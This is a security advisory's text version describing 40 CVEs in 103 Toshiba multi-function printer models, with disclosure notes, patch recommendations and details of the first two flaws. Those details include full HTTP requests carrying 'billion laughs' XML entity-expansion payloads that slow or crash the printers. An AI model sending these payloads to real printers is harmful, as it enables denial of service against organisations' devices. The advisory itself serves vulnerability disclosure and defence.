{
    "text": "title : Toshiba Multi-Function Printers 40 Vulnerabilities  ， detail : 103 models of Toshiba Multi-Function Printers ( MFP ) are vulnerable to 40 different vulnerabilities including remote code execution , local privilege escalation , xml injection , and more.  ， cve : advisories | CVE-2024-27141 , CVE-2024-27142 , CVE-2024-27143 , CVE-2024-27144 , CVE-2024-27145 , CVE-2024-27146 , CVE-2024-27147 , CVE-2024-27148 , CVE-2024-27149 , CVE-2024-27150 , CVE-2024-27151 , CVE-2024-27152 , CVE-2024-27153 , CVE-2024-27154  ，  ， desc : Hello ,   ， Please find a text-only version below sent to security mailing lists.  ， The complete version on \"40 vulnerabilities in Toshiba Multi-Function  ， Printers\" is posted here :   ， https : /pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html  ， The text version is also posted here :   ， https : /pierrekim.github.io/advisories/2024-toshiba-mfp.txt  ， = text-version of the advisory =  ， -BEGIN PGP SIGNED MESSAGE-  ， Hash : SHA512  ，  # Advisory Information  ， Title : 40 vulnerabilities in Toshiba Multi-Function Printers  ， Advisory URL : https : /pierrekim.github.io/advisories/2024-toshiba-mfp.txt  ， Blog URL : https : /pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html  ， Date published : 2024-06-27  ， Vendors contacted : Toshiba  ， Release mode : Released  ， CVE : CVE-2024-27141 , CVE-2024-27142 , CVE-2024-27143 , CVE-2024-27144 ,   ， CVE-2024-27145 , CVE-2024-27146 , CVE-2024-27147 , CVE-2024-27148 ,   ， CVE-2024-27149 , CVE-2024-27150 , CVE-2024-27151 , CVE-2024-27152 ,   ， CVE-2024-27153 , CVE-2024-27154 , CVE-2024-27155 , CVE-2024-27156 ,   ， CVE-2024-27157 , CVE-2024-27158 , CVE-2024-27159 , CVE-2024-27160 ,   ， CVE-2024-27161 , CVE-2024-27162 , CVE-2024-27163 , CVE-2024-27164 ,   ， CVE-2024-27165 , CVE-2024-27166 , CVE-2024-27167 , CVE-2024-27168 ,   ， CVE-2024-27169 , CVE-2024-27170 , CVE-2024-27171 , CVE-2024-27172 ,   ， CVE-2024-27173 , CVE-2024-27174 , CVE-2024-27175 , CVE-2024-27176 ,   ， CVE-2024-27177 , CVE-2024-27178 , CVE-2024-27179 , CVE-2024-27180  ，  # Product description  ， > e-STUDIO Multi-Function Printers ( MFPs ) are fast and productive , providing businesses and organisations the capability to produce what you need , when you need it.  ， >  ， > From https : /www.toshibatec.co.uk/workplace-solutions/products-and-solutions/mfps-and-printers/  ，  # Vulnerability Summary  ， Vulnerable versions : 103 different models of Toshiba Multi-Function  ， Printers ( MFP ) are vulnerable. It is recommended to visit the official  ， Toshiba advisory  ，  ( https : /www.toshibatec.com/information/20240531_01.html )  , review the  ， list of affected printers  ，  ( https : /www.toshibatec.com/information/pdf/information20240531_01.pdf )   ， and apply security patches and replace unsupported MFP models.  ， The summary of the vulnerabilities is as follows :   ， 1. CVE-2024-27141 - Pre-authenticated Blind XML External Entity ( XE )   ， injection - DoS  ， 2. CVE-2024-27142 - Pre-authenticated XE injection  ， 3. CVE-2024-27143 - Pre-authenticated Remote Code Execution as root  ， 4. CVE-2024-27144 - Pre-authenticated Remote Code Execution as root or  ， apache and multiple Local Privilege Escalations  ， 4.1. Remote Code Execution - Upload of a new .py module inside WSGI  ， Python programs  ， 4.2. Remote Code Execution - Upload of a new .ini configuration files  ， inside WSGI Python programs  ， 4.3. Remote Code Execution - Upload of a malicious script  ， `/tmp/backtraceScript.sh` and injection of malicious gdb commands  ， 4.4. Remote Code Execution - Upload of a malicious  ， `/home/SYSROM_SRC/build/common/bin/sapphost.py` program  ， 4.5. Remote Code Execution - Upload of malicious libraries  ， 4.6. Other ways to get Remote Code Execution  ， 5. CVE-2024-27145 - Multiple Post-authenticated Remote Code Executions as root  ， 6. CVE-2024-27146 - Lack of privileges separation  ， 7. CVE-2024-27147 - Local Privilege Escalation and Remote Code  ， Execution using snmpd  ， 8. CVE-2024-27148 - Local Privilege Escalation and Remote Code  ， Execution using insecure PATH  ， 9. CVE-2024-27149 - Local Privilege Escalation and Remote Code  ， Execution using insecure LD_PRELOAD  ， 10. CVE-2024-27150 - Local Privilege Escalation and Remote Code  ， Execution using insecure LD_LIBRARY_PATH  ， 11. CVE-2024-27151 - Local Privilege Escalation and Remote Code  ， Execution using insecure permissions for 106 programs  ， 11.1. 3 vulnerable programs not running as root  ， 11.2. 103 vulnerable programs running as root  ， 12. CVE-2024-27152 - Local Privilege Escalation and Remote Code  ， Execution using insecure permissions for libraries  ， 12.1. Example with `/home/SYSROM_SRC/bin/syscallerr`  ， 13. CVE-2024-27153 - Local Privilege Escalation and Remote Code  ， Execution using CISSM  ， 14. CVE-2024-27154 and CVE-2024-27155 - Passwords stored in clear-text  ， logs and insecure logs  ， 14.1. Clear-text password written in logs when an user logs into the printer  ， 14.2. Clear-text password written in logs when a password is modified  ， 15. CVE-2024-27156 - Leak of authentication sessions in insecure logs  ， in /ramdisk/work/log directory  ， 16. CVE-2024-27157 - Leak of authentication sessions in insecure logs  ， in /ramdisk/al/network/log directory  ， 17. CVE-2024-27158 - Hardcoded root password  ， 18. CVE-2024-27159 - Hardcoded password used to encrypt logs  ， 19. CVE-2024-27160 - Hardcoded password used to encrypt logs and use  ， of a weak digest cipher  ， 20. CVE-2024-27161 - Hardcoded password used to encrypt files  ， 21. CVE-2024-27162 - DOM-based XSS present in the /js/TopAccessUtil.js file  ， 22. CVE-2024-27163 - Leak of admin password and passwords  ， 23. CVE-2024-27164 - Hardcoded credentials in telnetd  ， 24. CVE-2024-27165 - Local Privilege Escalation using PROCSUID  ， 25. CVE-2024-27166 - Insecure permissions for core files  ， 26. CVE-2024-27167 - Insecure permissions used for Sendmail - Local  ， Privilege Escalation  ， 27. CVE-2024-27168 - Hardcoded keys found in Python applications used  ， to generate authentication cookies  ， 28. CVE-2024-27169 - Lack of authentication in WebPanel - Local  ， Privilege Escalation  ， 29. CVE-2024-27170 - Hardcoded credentials for WebDAV access  ， 30. CVE-2024-27171 - Insecure permissions  ， 31. CVE-2024-27172 - Remote Code Execution - command injection as root  ， 32. CVE-2024-27173 - Remote Code Execution - insecure upload  ， 33. CVE-2024-27174 - Remote Code Execution - insecure upload  ， 34. CVE-2024-27175 - Local File Inclusion  ， 35. CVE-2024-27176 - Remote Code Execution - insecure upload  ， 36. CVE-2024-27177 - Remote Code Execution - insecure upload  ， 37. CVE-2024-27178 - Remote Code Execution - insecure copy  ， 38. CVE-2024-27179 - Session disclosure inside the log files in the  ， installation of applications  ， 39. CVE-2024-27180 - TOCTOU vulnerability in the installation of  ， applications , allowing to install rogue applications and get RCE  ， CVE-2024-27171 to CVE-2024-27180 affect the implementation of  ， third-party application system and third-party applications installed  ， by default in Toshiba printers - this is an extremely interesting  ， attack surface for persistence.  ， TL ; DR : An attacker can compromise Toshiba Multi-Function Printers  ， using multiple vulnerabilities.  ， List of vulnerable models of Toshiba Multi-Function Printers ( 103 models )  :   ， 2021AC , 2521AC , 2020AC , 2520AC , 2025NC , 2525AC , 3025AC , 3525AC ,   ， 3525ACG , 4525AC , 4525ACG , 5525AC , 5525ACG ,   ， 6525AC , 6525ACG , 2528A , 3028A , 3528A , 3528AG , 4528A , 4528AG ,   ， 5528A , 6528A , 6526AC , 6527AC , 7527AC , 6529A ,   ， 7529A , 9029A , 330AC , 400AC , 2010AC , 2110AC , 2510AC , 2610AC ,   ， 2015NC , 2515AC , 2615AC , 3015AC , 3115AC , 3515AC ,   ， 3615AC , 4515AC , 4615AC , 5015AC , 5115AC , 2018A , 2518A , 2618A ,   ， 3018A , 3118A , 3018AG , 3518A , 3518AG , 3618A ,   ， 3618AG , 4518A , 4518AG , 4618A , 4618AG , 5018A , 5118A , 5516AC ,   ， 5616AC , 6516AC , 6616AC , 7516AC , 7616AC , 5518A ,   ， 5618A , 6518A , 6618A , 7518A , 7618A , 8518A , 8618A , 2000AC , 2500AC ,   ， 2005NC , 2505AC , 3005AC , 3505AC , 4505AC ,   ， 5005AC , 2008A , 2508A , 3008A , 3008AG , 3508A , 3508AG , 4508A , 4508AG ,   ， 5008A , 5506AC , 6506AC , 7506AC , 5508A ,   ， 6508A , 7508A , 8508A , 3508LP , 4508LP , 5008LP.  ， _Miscellaneous notes_ :   ， This security assessment was entirely done using a blackbox approach  ， and fully-remote - I only had some IPs of printers ( no physical access  ， and no credentials for admin or normal users ) . Consequently , the  ， physical security of the printers was not analyzed and the  ， vulnerabilities were confirmed with different models running the  ， latest firmware versions ( e-STUDIO2010AC , e-STUDIO3005AC ,   ， e-STUDIO3508A and e-STUDIO5018A ) .  ， The vulnerabilities were communicated to Toshiba on June 14 , 2023 and  ， communications with Toshiba were very effective.  ， _Impacts_  ， An attacker can compromise Toshiba multi-function printers ( MFP ) and  ， execute code. These printers are running Linux and are powerful. They  ， are ideal to host implants ( and fun programs , like Bettercap ) and move  ， laterally inside infrastructures.  ， _Recommendations_  ， - - Use network segmentation to isolate MFPs.  ， - - Apply security patches.  ， - - Replace unsupported MFPs.  ，  # Details - Pre-authenticated Blind XML External Entity ( XE ) injection - DoS  ， The Toshiba printers use XML communication for the `/contentwebserver`  ， API endpoint provided by the printer.  ， This endpoint is managed by an Apache module located inside the  ， `mod_contentwebserver.so` library. This library provides XML parsing  ， and is vulnerable to a time-based blind XML External Entity ( XE )   ， vulnerability.  ， Using a Billion-laugh attack , we can confirm there is a time-based  ， blind XE vulnerability. When sending only 1 entity ( &lol1 ) that is  ， defined inside the lolz root element , this &lol1 entity is expanding  ， into 10 entities and the request takes 200ms.  ， With an entity that is expanding into :   ， - - 10^10 entities , the request takes 206ms ;   ， - - 10^10^10 entities , the request takes 541ms ;   ， - - 10^10^10^10 entities , the request takes 2.7s ;   ， - - 10^10^10^10^2 entities , the request takes 8.8s ;   ， - - 10^10^10^10^2 entities , the request takes 30.9s ;   ， Even if the Apache server displays `MODULE_ERROR : SendRequest failed` ,   ， the XML has been successfully evaluated by the  ， `mod_contentwebserver.so` library running in the remote printer.  ， The payload is :   ， POST /contentwebserver HTTP/1.1  ， Host : 10.0.0.1 : 8080  ， User-Agent : Mozilla/5.0 ( X11 ; Linux x86_64 ; rv : 102.0 )   ， Gecko/20100101 Firefox/102.0  ， Accept :  * / *   ， Accept-Language : en-US , en ; q=0.5  ， Accept-Encoding : gzip , deflate  ， Cache-Control : no-cache  ， Pragma : no-cache  ， Content-Type : text/plain ; charset=utf-8  ， csrfpId : 10.0.0.2.852d519a6fa9825fae857bac5c003da0  ， Content-Length : 759  ， Origin : http : /10.0.0.1 : 8080  ， Connection : close  ， Referer : http : /10.0.0.1 : 8080/?MAIN=TOPACCESS  ， Cookie : Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0 ;   ， Locale=en-US , en # q=0.5 ; BrowserLang=en_US ; pageTrack=MAIN%3DLOGS ;   ， IgnoreSessionTimeout=1  ， < ! DOCTYPE lolz [   ， < ! ENTITY lol \"lol\">  ， < ! ELEMENT lolz (  # PCDATA ) >  ， < ! ENTITY lol1 \"&lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; \">  ， < ! ENTITY lol2  ， \"&lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; \">  ， < ! ENTITY lol3  ， \"&lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; \">  ， < ! ENTITY lol4  ， \"&lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; \">  ， < ! ENTITY lol5 \"&lol4 ; &lol4 ; &lol4 ; \">  ， < ! ENTITY lol6  ， \"&lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; \">  ， < ! ENTITY lol7  ， \"&lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; \">  ， < ! ENTITY lol8  ， \"&lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; \">  ， < ! ENTITY lol9  ， \"&lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; \">  ，  ] >  ， <lolz>&lol5 ; </lolz>  ， Using this HTTP request inside Burp ( with a correct session while  ， browsing the printer without authentication )  , we can modify the entity  ， on the last line ; we can see that the XML has been parsed by comparing  ， the time required for the printer to analyze the request.  ， The time will appear inside Burp on the bottom-right of the Window ( in  ， red in the following screenshots )  :   ，  [ please use the HTML version at  ， https : /pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html ]   ，  [ please use the HTML version at  ， https : /pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html ]   ， With 10^10^10^10^4 entity , then request takes 30 seconds.  ， HTTP requests containing more XML complexity ( with a lot of XML  ， entities to be parsed ) will DoS the printer and the CPU of the printer  ， will run at 100%.  ， The XML parser is vulnerable to XE , without authentication.  ， Exfiltration of file over HTTP , FTP and gopher was not obtained as  ， some protections seem to be implemented in the XML parser.  ，  # Details - Pre-authenticated XE injection  ， The Toshiba printers use XML communication for the `/contentwebserver`  ， API endpoint provided by the printer.  ， This endpoint is managed by an Apache module located inside the  ， `mod_contentwebserver.so` library. This library provides XML parsing  ， and is vulnerable to a XML External Entity ( XE ) vulnerability.  ， Using a Billion-laugh attack and correctly formatted data for the  ， printer ( with the Toshiba-specific non-public DTD , the tags will be  ， interpreted by the remote printer )  , we can confirm the presence of a  ， XE vulnerability. The resulting evaluated XML will be displayed by  ， the printer :   ，  [ please use the HTML version at  ， https : /pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html ]   ，  [ please use the HTML version at  ， https : /pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html ]   ， The malicious payload is ( containing a `<X>&lol4 ; </X>` )  :   ， POST /contentwebserver HTTP/1.1  ， Host : 10.0.0.1 : 8080  ， User-Agent : Mozilla/5.0 ( X11 ; Linux x86_64 ; rv : 102.0 )   ， Gecko/20100101 Firefox/102.0  ， Accept :  * / *   ， Accept-Language : en-US , en ; q=0.5  ， Accept-Encoding : gzip , deflate  ， Cache-Control : no-cache  ， Pragma : no-cache  ， Content-Type : text/plain ; charset=utf-8  ， csrfpId : 10.0.0.2.5d5255447c6eb69fc84a2d8c2056eb7d  ， Content-Length : 1226  ， Origin : http : /10.0.0.1 : 8080  ， Connection : close  ， Referer : http : /10.0.0.1 : 8080/Administration/CreateNewPwd.html  ， Cookie : Locale=en-US , en # q=0.5 ; BrowserLang=en_US ;   ， pageTrack=MAIN%3DDEVICE ; IgnoreSessionTimeout=1 ; clicked=0 ;   ， addrLastVisited=ADDRBK ;   ， Session=10.0.0.2.5d5255447c6eb69fc84a2d8c2056eb7d ;   ， PREF=%7BList%2C8%2CClip  ， boardForPage-%7D ; PROGSTAT=0  ， < ! DOCTYPE lolz [   ， < ! ENTITY lol \"lol\">  ， < ! ELEMENT lolz (  # PCDATA ) >  ， < ! ENTITY lol1 \"&lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; &lol ; \">  ， < ! ENTITY lol2  ， \"&lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; &lol1 ; \">  ， < ! ENTITY lol3  ， \"&lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; &lol2 ; \">  ， < ! ENTITY lol4  ， \"&lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; &lol3 ; \">  ， < ! ENTITY lol5 \"&lol4 ; &lol4 ; &lol4 ; \">  ， < ! ENTITY lol6  ， \"&lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; &lol5 ; \">  ， < ! ENTITY lol7  ， \"&lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; &lol6 ; \">  ， < ! ENTITY lol8  ， \"&lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; &lol7 ; \">  ， < ! ENTITY lol9  ， \"&lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; &lol8 ; \">  ，  ] >",
    "time": "Jul 4, 2024"
}